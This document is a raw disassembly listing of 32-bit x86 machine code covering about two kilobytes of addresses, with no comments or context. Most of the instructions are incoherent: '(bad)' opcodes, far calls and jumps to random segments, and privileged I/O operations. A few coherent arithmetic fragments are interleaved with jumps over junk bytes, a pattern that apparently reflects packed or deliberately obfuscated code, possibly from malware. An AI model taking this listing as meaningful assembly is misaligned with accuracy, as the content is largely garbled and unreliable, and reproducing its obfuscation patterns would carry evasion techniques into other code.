  4020d7:	lods   eax,DWORD PTR ds:[esi]
  4020d8:	xchg   ecx,eax
  4020d9:	xchg   BYTE PTR gs:[edi],bl
  4020dc:	inc    edi
  4020dd:	push   esp
  4020de:	cmp    dh,al
  4020e0:	inc    ecx
  4020e1:	fnsave [eax]
  4020e3:	mov    dl,0xf5
  4020e5:	mov    ds:0xd3e571c8,eax
  4020ea:	sbb    al,0x41
  4020ec:	jnp    0x402118
  4020ee:	xchg   ecx,eax
  4020ef:	enter  0xbe8a,0x32
  4020f3:	inc    BYTE PTR [edi+0x1f3c465]
  4020f9:	ret    
  4020fa:	xlat   BYTE PTR ds:[ebx]
  4020fb:	push   edx
  4020fc:	repz cwde 
  4020fe:	pop    esi
  4020ff:	fs mov ebx,0x76856152
  402105:	ss popa 
  402107:	add    ah,BYTE PTR [ebx+0x25c10ad6]
  40210d:	les    ebx,FWORD PTR [ecx]
  40210f:	sub    esp,0x7eb376ed
  402115:	sti    
  402116:	jmp    0x402166
  402118:	adc    al,0x22
  40211a:	test   eax,0x62cff07e
  40211f:	mov    edx,0xd6e74af
  402124:	sbb    BYTE PTR [ecx+0x1d5ebc35],ch
  40212a:	lds    edx,FWORD PTR [edx+0x1b2b3e0c]
  402130:	idiv   BYTE PTR [edi+0xa4f891d]
  402136:	sub    BYTE PTR [ecx-0x50],0x5a
  40213a:	inc    esi
  40213b:	shl    DWORD PTR fs:[eax+0x1d],0xf1
  402140:	sub    DWORD PTR [edx+0x8694d1c],0x35c2c21d
  40214a:	sbb    al,0xaf
  40214c:	test   DWORD PTR [edx+0x2f700613],0x51a3252b
  402156:	fcom   DWORD PTR [ebx-0x4ef38db]
  40215c:	push   0xffffffd4
  40215e:	sub    DWORD PTR [ecx],ebx
  402160:	mov    esp,0xd48763b2
  402165:	dec    edi
  402166:	mov    cl,0x85
  402168:	fnstenv [esi]
  40216a:	mov    esp,DWORD PTR [edi+eiz*2]
  40216d:	outs   dx,BYTE PTR ds:[esi]
  40216e:	inc    eax
  40216f:	out    dx,eax
  402170:	stos   DWORD PTR es:[edi],eax
  402171:	cmp    DWORD PTR [ecx-0x1c7fba7e],esi
  402177:	call   0xa645:0xc8dfef13
  40217e:	and    ecx,DWORD PTR [eax+0x29e92836]
  402184:	loopne 0x402159
  402186:	dec    ebx
  402187:	sbb    BYTE PTR [eax+eiz*1-0x73],dh
  40218b:	mov    edi,DWORD PTR [esi-0xfe244c6]
  402191:	sbb    al,0x55
  402193:	mov    ds:0x132a08df,al
  402198:	loopne 0x4021db
  40219a:	gs or  eax,0x62011067
  4021a0:	sbb    edi,DWORD PTR [ebp+0x30a032a5]
  4021a6:	xchg   esp,eax
  4021a7:	cs cwde 
  4021a9:	cmp    DWORD PTR [esi-0x736d4619],0xfffffff7
  4021b0:	adc    eax,0xef097721
  4021b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4021b6:	mov    ebp,0x9ecbc0a3
  4021bb:	retf   0x6ad0
  4021be:	js     0x402176
  4021c0:	sub    DWORD PTR [esi+eax*1-0x68],0x57684290
  4021c8:	(bad)  
  4021c9:	retf   0x239
  4021cc:	mov    ecx,0x19b246be
  4021d1:	jmp    0x40218d
  4021d3:	or     ebx,DWORD PTR [edx-0x452bb]
  4021d9:	cmp    esi,DWORD PTR [edi-0x153ffd82]
  4021df:	dec    edx
  4021e0:	fsubr  DWORD PTR gs:[ebx-0x67252ddc]
  4021e7:	adc    eax,0x5d6163c
  4021ec:	icebp  
  4021ed:	dec    edi
  4021ee:	mov    dh,BYTE PTR [edi]
  4021f0:	jge    0x40222c
  4021f2:	frndint 
  4021f4:	sar    BYTE PTR [edx+0x565bd89d],1
  4021fa:	cli    
  4021fb:	mov    ?,WORD PTR [eax+0x6a]
  4021fe:	push   0xffffffdb
  402200:	popf   
  402201:	jecxz  0x4021fb
  402203:	xor    edi,esi
  402205:	xor    BYTE PTR [ebp-0x29c1097a],0xdb
  40220c:	or     BYTE PTR [esi],bl
  40220e:	loopne 0x4021a3
  402210:	xor    eax,0xa09d82a3
  402215:	push   edi
  402216:	pop    ecx
  402217:	dec    eax
  402218:	mov    BYTE PTR ds:0xa301381f,al
  40221e:	push   ecx
  40221f:	and    DWORD PTR [edi],0x6a888efd
  402225:	aas    
  402226:	pop    edi
  402227:	fild   DWORD PTR [edi+0x7b]
  40222a:	je     0x402278
  40222c:	xor    ebx,eax
  40222e:	lahf   
  40222f:	retf   
  402230:	jmp    0x7b94cb0
  402235:	stos   DWORD PTR es:[edi],eax
  402236:	cld    
  402237:	imul   esp,DWORD PTR [ebp-0x22877c6f],0xffffffc6
  40223e:	aam    0xcb
  402240:	dec    esi
  402241:	leave  
  402242:	cld    
  402243:	and    eax,0x7a499fe
  402248:	loope  0x4021ca
  40224a:	pop    ebp
  40224b:	mov    dl,0xca
  40224d:	pop    ds
  40224e:	sti    
  40224f:	iret   
  402250:	push   ebx
  402251:	add    edi,DWORD PTR [ecx+0x6dba1c67]
  402257:	fistp  WORD PTR [ebx+0x70]
  40225a:	jo     0x4022c8
  40225c:	mov    cl,0xb9
  40225e:	xchg   esp,eax
  40225f:	call   0xa48db6a0
  402264:	and    eax,0x39635996
  402269:	inc    ebp
  40226a:	or     eax,0xfa85c7d9
  40226f:	jb     0x40225a
  402271:	inc    esp
  402272:	fadd   st,st(3)
  402274:	cdq    
  402275:	pop    ecx
  402276:	je     0x4026fd
  40227c:	mov    eax,DWORD PTR [ebp-0x14]
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [eax+0x39],ebx
  40229c:	and    dl,BYTE PTR ds:0x70700270
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	(bad)  
  4022a7:	xchg   edx,eax
  4022a8:	popf   
  4022a9:	jae    0x4022c6
  4022ab:	push   0xa9a1942
  4022b0:	mov    al,0xe2
  4022b2:	xchg   esp,eax
  4022b3:	call   0xe0d55825
  4022b8:	arpl   WORD PTR [si-0x53],di
  4022bc:	jo     0x402332
  4022be:	sbb    eax,0x894364c8
  4022c3:	xor    BYTE PTR [edi],0x16
  4022c6:	lea    ecx,[ebx-0x63ad904c]
  4022cc:	cmc    
  4022cd:	xchg   DWORD PTR [edi],ebx
  4022cf:	add    ch,BYTE PTR [edi-0x4d4bc4e0]
  4022d5:	pop    ds
  4022d6:	sub    al,0x24
  4022d8:	add    ebp,DWORD PTR [eax]
  4022da:	fimul  DWORD PTR [ebx-0x5de141fd]
  4022e0:	imul   dl
  4022e2:	cmp    eax,0x7cd3b81c
  4022e7:	lock aaa 
  4022e9:	dec    ebp
  4022ea:	sbb    edi,DWORD PTR [edx-0x24]
  4022ed:	mov    ecx,0x3eb9b9d7
  4022f2:	jb     0x402369
  4022f4:	repnz push ecx
  4022f6:	aaa    
  4022f7:	cmp    DWORD PTR [edi],0x52596171
  4022fd:	pop    ebp
  4022fe:	xchg   DWORD PTR [ebp+0x23ed8cc],edx
  402304:	inc    DWORD PTR [edi-0x18da1ab9]
  40230a:	rcl    dh,1
  40230c:	mov    esi,0x32411cbd
  402311:	xor    BYTE PTR [ecx],cl
  402313:	das    
  402314:	inc    esi
  402315:	pop    edx
  402316:	popf   
  402317:	or     BYTE PTR [esi],cl
  402319:	jmp    0x5710eacd
  40231e:	aad    0x9c
  402320:	nop
  402321:	dec    edi
  402322:	push   esp
  402323:	jmp    0x402360
  402325:	xchg   edx,esi
  402327:	mov    ds:0x622ba258,al
  40232c:	mov    esi,0x17f4aaa0
  402331:	push   ebp
  402332:	sahf   
  402333:	add    al,0xa3
  402335:	int    0x5a
  402337:	mov    ?,WORD PTR [esi]
  402339:	int    0xa6
  40233b:	dec    edx
  40233c:	(bad)  
  40233d:	jl     0x402335
  40233f:	fldenv [edi]
  402341:	data16 jge 0x402330
  402344:	and    bl,ah
  402346:	mov    ecx,0x46681ad1
  40234b:	inc    edi
  40234c:	jb     0x4022d6
  40234e:	jmp    0x6954:0xe56b42b8
  402355:	sti    
  402356:	cld    
  402357:	popa   
  402358:	jae    0x402361
  40235a:	call   DWORD PTR [edi]
  40235c:	xor    BYTE PTR [ebx],cl
  40235e:	inc    esp
  40235f:	lahf   
  402360:	pop    eax
  402361:	popa   
  402362:	cmp    BYTE PTR [edx],dl
  402364:	das    
  402365:	push   eax
  402366:	inc    ecx
  402367:	dec    edi
  402368:	(bad)  
  402369:	fnstenv [ecx+0x4cc7f7e5]
  40236f:	leave  
  402370:	ret    
  402371:	(bad)  
  402372:	pop    edx
  402373:	pop    ss
  402374:	mov    al,ds:0xa218504
  402379:	add    eax,0xba674911
  40237e:	int    0xeb
  402380:	lahf   
  402381:	mov    ecx,0x716a0b97
  402386:	xchg   BYTE PTR [eax],bl
  402388:	test   eax,0x352be2f5
  40238d:	mov    dh,0x8c
  40238f:	cmp    dh,cl
  402391:	jmp    0x5fd9:0x812f7c7f
  402398:	in     eax,dx
  402399:	xchg   DWORD PTR [eax],ebp
  40239b:	ins    DWORD PTR es:[edi],dx
  40239c:	mov    ds:0x8091ac9,al
  4023a1:	sbb    ecx,edi
  4023a3:	call   0xa9fb:0xaa1d5f0f
  4023aa:	stos   DWORD PTR es:[edi],eax
  4023ab:	xor    al,0xb2
  4023ad:	xchg   ebp,eax
  4023ae:	pop    ebx
  4023af:	mov    al,0xb2
  4023b1:	mov    ch,0xb9
  4023b3:	(bad)  
  4023b4:	sub    ch,BYTE PTR [esi]
  4023b6:	bswap  edx
  4023b8:	popa   
  4023b9:	inc    esp
  4023ba:	icebp  
  4023bb:	repnz mov esi,0xd347da50
  4023c1:	push   ebp
  4023c2:	out    dx,eax
  4023c3:	pop    ecx
  4023c4:	xchg   ecx,eax
  4023c5:	mov    esi,0xaffc8767
  4023ca:	and    BYTE PTR [edi+0x6],cl
  4023cd:	into   
  4023ce:	or     BYTE PTR [edx],ah
  4023d0:	(bad)  
  4023d1:	leave  
  4023d2:	mov    ds:0xcd6b7cc6,eax
  4023d7:	pop    es
  4023d8:	(bad)  [esi]
  4023da:	out    dx,eax
  4023db:	popf   
  4023dc:	jmp    0xd34bcf36
  4023e1:	or     DWORD PTR [edi],ebx
  4023e3:	cs jmp 0x402370
  4023e6:	sbb    BYTE PTR [esi+0x5c],al
  4023e9:	jecxz  0x402393
  4023eb:	jp     0x4023ce
  4023ed:	in     al,dx
  4023ee:	(bad)  
  4023ef:	cmp    esi,ebp
  4023f1:	call   0xd6759e0
  4023f6:	jno    0x402433
  4023f8:	jg     0x402415
  4023fa:	sub    bh,BYTE PTR [esi+0x52]
  4023fd:	test   eax,esp
  4023ff:	shr    DWORD PTR [edi],1
  402401:	mov    al,ds:0x24fc49f
  402406:	outs   dx,DWORD PTR ds:[esi]
  402407:	iret   
  402408:	mov    ds:0x7bec9f64,al
  40240d:	rol    cl,1
  40240f:	aas    
  402410:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402411:	ins    DWORD PTR es:[edi],dx
  402412:	jo     0x402434
  402414:	push   0xffffffad
  402416:	stos   DWORD PTR es:[edi],eax
  402417:	dec    esp
  402418:	dec    edx
  402419:	in     eax,dx
  40241a:	popa   
  40241b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40241c:	xor    bl,dh
  40241e:	sub    al,0xb3
  402420:	stos   BYTE PTR es:[edi],al
  402421:	mov    ds:0x45751025,eax
  402426:	push   ebp
  402427:	xor    BYTE PTR [esi+0x3ada1ee0],ah
  40242d:	push   ebx
  40242e:	sbb    DWORD PTR [eax-0x307ec42],edx
  402434:	add    esi,DWORD PTR [ebx+0x7e]
  402437:	adc    al,BYTE PTR [eax]
  402439:	test   al,0xba
  40243b:	xchg   BYTE PTR [eax-0x7b],ch
  40243e:	gs mov dl,0xf3
  402441:	cmc    
  402442:	and    cl,BYTE PTR [ecx-0x1295a0f6]
  402448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402449:	lods   eax,DWORD PTR ds:[esi]
  40244a:	les    esp,FWORD PTR [eax-0x359998d0]
  402450:	jae    0x4023d6
  402452:	mov    edi,0x824eff52
  402457:	adc    eax,0x3e55392e
  40245c:	or     BYTE PTR [esi-0x437c8498],cl
  402462:	stos   BYTE PTR es:[edi],al
  402463:	(bad)  
  402464:	fdivr  st(0),st
  402466:	aaa    
  402467:	nop
  402468:	clc    
  402469:	je     0x40240a
  40246b:	jmp    0x4eaeabc5
  402470:	mov    eax,ds:0xf60e88b1
  402475:	lods   eax,DWORD PTR ds:[esi]
  402476:	or     eax,0x62388a7c
  40247b:	loop   0x402420
  40247d:	les    ecx,FWORD PTR [ecx]
  40247f:	shr    DWORD PTR [edx-0x78630af3],0x8d
  402486:	fbld   TBYTE PTR [edi]
  402488:	fwait
  402489:	mov    ds:0x2e6b7185,al
  40248e:	add    eax,0x9f5456f6
  402493:	arpl   WORD PTR [edx+0x7a],si
  402496:	mov    ah,0x1
  402498:	ror    BYTE PTR [eax+0x3d31debf],0xaa
  40249f:	mov    al,ds:0x8897c2a0
  4024a4:	dec    ecx
  4024a5:	pcmpgtd mm1,QWORD PTR [ebx+0x3ebbc855]
  4024ac:	mov    al,BYTE PTR [eax]
  4024ae:	add    BYTE PTR [esi+0x33],ah
  4024b1:	ror    DWORD PTR [ebx+0x366f85d],cl
  4024b7:	xlat   BYTE PTR ds:[ebx]
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx-0x60f18c9],cl
  4024f4:	fnstenv [eax+0x0]
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	adc    al,BYTE PTR [ebx-0x24]
  402500:	dec    ebx
  402501:	iret   
  402502:	mov    bh,0x43
  402504:	pop    ds
  402505:	call   0x3390:0x7e897745
  40250c:	test   eax,0xe7b46035
  402511:	and    DWORD PTR [ebx-0x4d],ecx
  402514:	mov    ah,0x45
  402516:	jge    0x402506
  402518:	iret   
  402519:	or     DWORD PTR [eax-0x2c],esi
  40251c:	sbb    al,0x33
  40251e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40251f:	mov    esp,0x595b3149
  402524:	(bad)  
  402526:	push   esi
  402527:	fnsave [edx-0x66]
  40252a:	mov    WORD PTR [eax+0x6287805b],gs
  402530:	mov    DWORD PTR [edx+0x1b],eax
  402533:	sbb    al,0xfa
  402535:	add    eax,0x38afd34d
  40253a:	jno    0x4024fb
  40253c:	jle    0x4024ed
  40253e:	xchg   esp,eax
  40253f:	mov    esp,0x43f6997c
  402544:	push   cs
  402545:	and    DWORD PTR [ecx+0x9],0x1c
  402549:	dec    ecx
  40254a:	imul   ebp,DWORD PTR [ecx],0xfcf4edf8
  402550:	dec    edi
  402551:	mov    ebp,0x76fabe6f
  402556:	sti    
  402557:	push   ss
  402558:	push   edx
  402559:	inc    esi
  40255a:	jg     0x4025af
  40255c:	out    dx,al
  40255d:	add    ecx,DWORD PTR [esi]
  40255f:	into   
  402560:	jle    0x40250d
  402562:	mov    esi,DWORD PTR [edi]
  402564:	and    esp,DWORD PTR ds:0xc837559b
  40256a:	mov    eax,?
  40256c:	test   BYTE PTR [edi],al
  40256e:	add    al,0xf5
  402570:	sti    
  402571:	xor    al,0x4a
  402573:	push   ecx
  402574:	jae    0x402547
  402576:	xor    esi,edi
  402578:	mov    ecx,0x5e71f015
  40257d:	pop    edi
  40257e:	sbb    eax,0xede865a1
  402583:	mov    ah,0x94
  402585:	adc    eax,0x1aba5eb1
  40258a:	or     DWORD PTR ds:0x4a674e60,0xffffffc6
  402591:	rcl    DWORD PTR [edi],cl
  402593:	xchg   esi,eax
  402594:	cdq    
  402595:	xchg   edi,eax
  402596:	push   ebp
  402597:	fist   DWORD PTR [esi]
  402599:	ss aaa 
  40259b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40259c:	popa   
  40259d:	inc    edi
  40259e:	dec    ecx
  40259f:	jmp    0x7770afe6
  4025a4:	sub    cl,BYTE PTR fs:[eax+0x6f6197f2]
  4025ab:	jbe    0x402549
  4025ad:	leave  
  4025ae:	aaa    
  4025af:	cmp    edx,DWORD PTR [ebp+0x3f63682f]
  4025b5:	mov    al,ds:0x928a424f
  4025ba:	jle    0x40256d
  4025bc:	clc    
  4025bd:	pop    eax
  4025be:	popa   
  4025bf:	gs adc edx,edi
  4025c2:	sbb    al,0xbf
  4025c4:	adc    cl,cl
  4025c6:	test   esi,edi
  4025c8:	bound  esp,QWORD PTR [ebx+esi*4-0xf]
  4025cc:	fcomi  st,st(5)
  4025ce:	sbb    eax,0xfdb2fb48
  4025d3:	hlt    
  4025d4:	jbe    0x4025c6
  4025d6:	xchg   esi,eax
  4025d7:	xor    DWORD PTR [edi+0x6f2d211a],eax
  4025dd:	sub    BYTE PTR [edi+0x79],al
  4025e0:	or     eax,eax
  4025e2:	fidivr WORD PTR [eax]
  4025e4:	leave  
  4025e5:	std    
  4025e6:	lods   eax,DWORD PTR ds:[esi]
  4025e7:	sbb    ebp,DWORD PTR [eax-0x584706c1]
  4025ed:	xchg   esi,eax
  4025ee:	push   ebx
  4025ef:	retf   0x8a4
  4025f2:	inc    ebp
  4025f3:	je     0x402595
  4025f5:	mov    al,ds:0x8bad8662
  4025fa:	scas   al,BYTE PTR es:[edi]
  4025fb:	jne    0x402655
  4025fd:	and    ebx,DWORD PTR [ebp-0x1d61de86]
  402603:	rol    DWORD PTR fs:[edi+0xcc8aa59],1
  40260a:	cmp    DWORD PTR [ecx-0x69],eax
  40260d:	(bad)  
  40260e:	in     al,0xc
  402610:	jle    0x4025f8
  402612:	xor    DWORD PTR [ecx+0x2509d1d6],esi
  402618:	dec    ebp
  402619:	imul   ecx,DWORD PTR [eax-0x6aef7500],0x85e1bd3b
  402623:	int    0x18
  402625:	sub    BYTE PTR [edi+0x3d81c2ce],cl
  40262b:	mov    ds:0xb2799de0,eax
  402630:	mov    bl,0x9b
  402632:	ror    ch,1
  402634:	or     ecx,DWORD PTR [eax-0x3a15a976]
  40263a:	in     al,0xe9
  40263c:	sbb    eax,DWORD PTR [edi]
  40263e:	call   0x8161:0xf26c002f
  402645:	test   eax,0x8b8073f5
  40264a:	or     DWORD PTR [esi-0x18],eax
  40264d:	aaa    
  40264e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40264f:	push   eax
  402650:	mov    ecx,0xb31ed22e
  402655:	adc    BYTE PTR [esi+edx*1+0x715117a1],bl
  40265c:	inc    ecx
  40265d:	jmp    0x4025fd
  40265f:	repnz sub DWORD PTR [ebp+0x73cd592e],ebx
  402666:	jb     0x402655
  402668:	cmp    al,0x2
  40266a:	cmp    edx,esi
  40266c:	pop    eax
  40266d:	arpl   bx,cx
  40266f:	mov    ecx,0x38347d55
  402674:	add    al,0x8f
  402676:	arpl   si,bx
  402678:	jnp    0x4025fa
  40267a:	add    eax,esp
  40267c:	add    DWORD PTR [eax-0x54],eax
  40267f:	int3   
  402680:	loop   0x4026f4
  402682:	fsubr  st(4),st
  402684:	xor    ah,0xb1
  402687:	and    DWORD PTR [ecx-0x51],0x6faf9c1e
  40268e:	in     al,dx
  40268f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402690:	jae    0x40267f
  402692:	sub    dh,ch
  402694:	xchg   esi,eax
  402695:	ins    BYTE PTR es:[edi],dx
  402696:	mov    ebp,0xd5204f73
  40269b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40269c:	in     eax,0x8e
  40269e:	mov    ds:0x94bdebe3,al
  4026a3:	pop    ss
  4026a4:	retf   
  4026a5:	fwait
  4026a6:	(bad)  
  4026a7:	adc    ebp,DWORD PTR [edx+0x443a7897]
  4026ad:	xchg   edx,eax
  4026ae:	push   ecx
  4026af:	daa    
  4026b0:	enter  0xb4c2,0x71
  4026b4:	clc    
  4026b5:	push   0x3a
  4026b7:	nop
  4026b8:	jmp    0x1013:0x1dfad8d7
  4026bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026c0:	inc    esi
  4026c1:	push   edi
  4026c2:	xchg   edx,eax
  4026c3:	fdiv   DWORD PTR [edx+0x7607f4af]
  4026c9:	(bad)  
  4026ca:	xor    ah,BYTE PTR [ebx+ebp*2+0x475880d4]
  4026d1:	jecxz  0x4026d9
  4026d3:	aad    0x63
  4026d5:	nop
  4026d6:	jo     0x4026f0
  4026d8:	(bad)  
  4026d9:	shl    DWORD PTR [ebx-0x50f492fa],1
  4026df:	push   esi
  4026e0:	or     cl,BYTE PTR [edi-0x1e]
  4026e3:	(bad)  
  4026e4:	sbb    BYTE PTR [ecx+edx*8],bl
  4026e7:	cli    
  4026e8:	sahf   
  4026e9:	fidiv  DWORD PTR [edx-0x48ea336c]
  4026ef:	jbe    0x4026de
  4026f1:	dec    ebp
  4026f2:	test   cl,ah
  4026f4:	push   ecx
  4026f5:	daa    
  4026f6:	mov    al,ds:0xd21ffa35
  4026fb:	icebp  
  4026fc:	adc    DWORD PTR [ebx+0x558bf445],ecx
  402702:	call   0x7d7de93a
  402707:	or     esi,DWORD PTR [esp+ecx*4+0x1d840f]
  40270e:	add    BYTE PTR [eax],al
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x1511914b
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	out    dx,eax
  402768:	push   esi
  402769:	jl     0x4027ad
  40276b:	jno    0x402752
  40276d:	mov    dh,0x3d
  40276f:	dec    ecx
  402770:	aaa    
  402771:	pop    ebp
  402772:	sbb    edx,DWORD PTR [eax]
  402774:	aas    
  402775:	(bad)  
  402778:	nop
  402779:	into   
  40277a:	adc    al,0xd
  40277c:	mov    ebx,0x6294a179
  402781:	pop    edi
  402782:	lods   al,BYTE PTR ds:[esi]
  402783:	test   al,0x9c
  402785:	jae    0x4027da
  402787:	push   ebx
  402788:	add    DWORD PTR [ebx],0xed7a7530
  40278e:	jmp    0x40276b
  402790:	xor    esp,DWORD PTR [esi+0x27]
  402793:	inc    edi
  402794:	and    al,0xcc
  402796:	mov    ds:0x6b3720bb,eax
  40279b:	hlt    
  40279c:	mov    al,0x4a
  40279e:	inc    edx
  40279f:	mov    esi,0xc429ce21
  4027a4:	jb     0x40274c
  4027a6:	or     DWORD PTR [ecx-0x42a1420d],0x9ce018f7
  4027b0:	stc    
  4027b1:	ror    DWORD PTR ds:0x52c0fd44,1
  4027b7:	xor    esp,ebp
  4027b9:	jbe    0x4027dd
  4027bb:	in     eax,dx
  4027bc:	xlat   BYTE PTR ds:[ebx]
  4027bd:	push   ebx
  4027be:	sub    BYTE PTR [ecx],bl
  4027c0:	outs   dx,DWORD PTR ds:[esi]
  4027c1:	sbb    ebp,DWORD PTR [edi-0x6e]
  4027c4:	inc    edi
  4027c5:	pop    ebp
  4027c6:	cli    
  4027c7:	ret    0xf36f
  4027ca:	outs   dx,BYTE PTR ds:[esi]
  4027cb:	imul   ecx,DWORD PTR [eax-0x1456c7a2],0xffffffd9
  4027d2:	pop    ds
  4027d3:	add    edi,esp
  4027d5:	xchg   edx,eax
  4027d6:	sbb    esi,DWORD PTR [ecx]
  4027d8:	push   ss
  4027d9:	nop
  4027da:	jb     0x4027ce
  4027dc:	mov    edi,0x4e7ed02c
  4027e1:	xchg   ebx,eax
  4027e2:	and    al,0x97
  4027e4:	cmp    al,0x8
  4027e6:	mov    bh,BYTE PTR [ebx+0x2869ec64]
  4027ec:	inc    ebx
  4027ed:	loopne 0x40286d
  4027ef:	or     eax,0x3a2729ca
  4027f4:	lods   eax,DWORD PTR ds:[esi]
  4027f5:	dec    ebp
  4027f6:	pop    ds
  4027f7:	pop    esi
  4027f8:	jae    0x402852
  4027fa:	out    0x43,al
  4027fc:	mov    esp,DWORD PTR [esi-0x523a3206]
  402802:	sar    BYTE PTR [edi+0x61],cl
  402805:	adc    ebp,DWORD PTR [eax-0x3b593035]
  40280b:	scas   eax,DWORD PTR es:[edi]
  40280c:	nop
  40280d:	push   ecx
  40280e:	rcl    DWORD PTR [esp+eiz*2],1
  402811:	inc    esp
  402812:	cmp    ah,BYTE PTR [eax+0x6f233bee]
  402818:	test   DWORD PTR [esi],0x68fea95f
  40281e:	(bad)  
  402820:	jmp    0x7213:0x23c23f07
  402827:	dec    ebx
  402828:	(bad)  
  402829:	sar    BYTE PTR [ecx],1
  40282b:	push   0xffffff87
  40282d:	jmp    0x473a:0xaf807325
  402834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402835:	add    DWORD PTR [esi+0x7b],esp
  402838:	jmp    FWORD PTR [eax+0x41]
  40283b:	(bad)  
  40283c:	xchg   esi,eax
  40283d:	in     eax,dx
  40283e:	cs enter 0x8035,0x47
  402843:	pop    edx
  402844:	nop
  402845:	lds    ebx,FWORD PTR [eax]
  402847:	push   ecx
  402848:	sub    eax,0x865ddb3b
  40284d:	adc    bl,BYTE PTR [edi+ecx*2-0x7e5e6cae]
  402854:	lods   eax,DWORD PTR ds:[esi]
  402855:	xchg   ebx,eax
  402856:	mov    edi,0x58ea6f5f
  40285b:	mov    bl,0x4
  40285d:	loope  0x402870
  40285f:	adc    al,0x3
  402861:	sub    esi,ecx
  402863:	outs   dx,DWORD PTR ds:[esi]
  402864:	pop    edx
  402865:	and    dh,BYTE PTR [ebx+0xe]
  402868:	xor    esi,DWORD PTR [edx+0x25c7c318]
  40286e:	(bad)  
  40286f:	and    dl,bl
  402871:	xchg   ebx,eax
  402872:	leave  
  402873:	mov    eax,0x795deacb
  402878:	cmp    BYTE PTR [ecx],ah
  40287a:	inc    edx
  40287b:	push   ss
  40287c:	loop   0x402854
  40287e:	push   ebx
  40287f:	imul   eax,DWORD PTR [ecx+0x16b63f88],0x44861219
  402889:	dec    ebp
  40288a:	push   cs
  40288b:	mov    dh,BYTE PTR [ecx]
  40288d:	inc    esi
  40288e:	mov    edx,0x3e441079
  402893:	addr16 popa 
  402895:	inc    edx
  402896:	imul   edi,ebp,0xb19863c8
  40289c:	adc    BYTE PTR [ebx-0x5f8ef292],bl
  4028a2:	and    ebx,DWORD PTR [esi+0x58643470]
  4028a8:	mov    dl,0xc2
  4028aa:	pop    DWORD PTR [edi]
  4028ac:	pop    ebx
  4028ad:	or     al,0xa2
  4028af:	loopne 0x402910
  4028b1:	popa   
  4028b2:	pop    ds
  4028b3:	ds in  eax,0x89
  4028b6:	pop    ss
  4028b7:	pusha  
  4028b8:	adc    eax,0x55684be9
  4028bd:	sbb    dh,dl
  4028bf:	inc    edi
  4028c0:	popf   
  4028c1:	xchg   edi,eax
  4028c2:	push   ebx
  4028c3:	outs   dx,DWORD PTR ds:[esi]
  4028c4:	arpl   WORD PTR [ecx-0x416d3e94],di
  4028ca:	icebp  
  4028cb:	mov    eax,DWORD PTR [eax-0x1b]
  4028ce:	stos   DWORD PTR es:[edi],eax
  4028cf:	xchg   ebp,eax
  4028d0:	mov    al,ds:0xf94e7d46
  4028d5:	push   edx
  4028d6:	out    dx,al
  4028d7:	call   0xa921:0x67af0687
  4028de:	jmp    0xe01b:0xbce524be
  4028e5:	out    0x90,eax
  4028e7:	sbb    BYTE PTR [esp+ecx*8+0x5d],bh
  4028eb:	push   ebp
  4028ec:	cmp    DWORD PTR [esi-0x39],esp
  4028ef:	int    0x41
  4028f1:	mov    dl,0x45
  4028f3:	adc    ebp,DWORD PTR [edx-0x12]
  4028f6:	cli    
  4028f7:	jle    0x402978
  4028f9:	(bad)  
  4028fa:	ins    DWORD PTR es:[edi],dx
  4028fb:	pop    esp
  4028fc:	inc    ebp
  4028fd:	leave  
  4028fe:	jp     0x4028b2
  402900:	xchg   BYTE PTR [edx+0x4b591023],dh
  402906:	cwde   
  402907:	pop    ss
  402908:	push   ss
  402909:	loope  0x402941
  40290b:	xor    eax,0xdc8398c3
  402910:	repz mov eax,ds:0x253fe77b
  402916:	mov    al,ds:0x56aee979
  40291b:	pop    edx
  40291c:	cmp    al,0x98
  40291e:	inc    ebp
  40291f:	jge    0x4028be
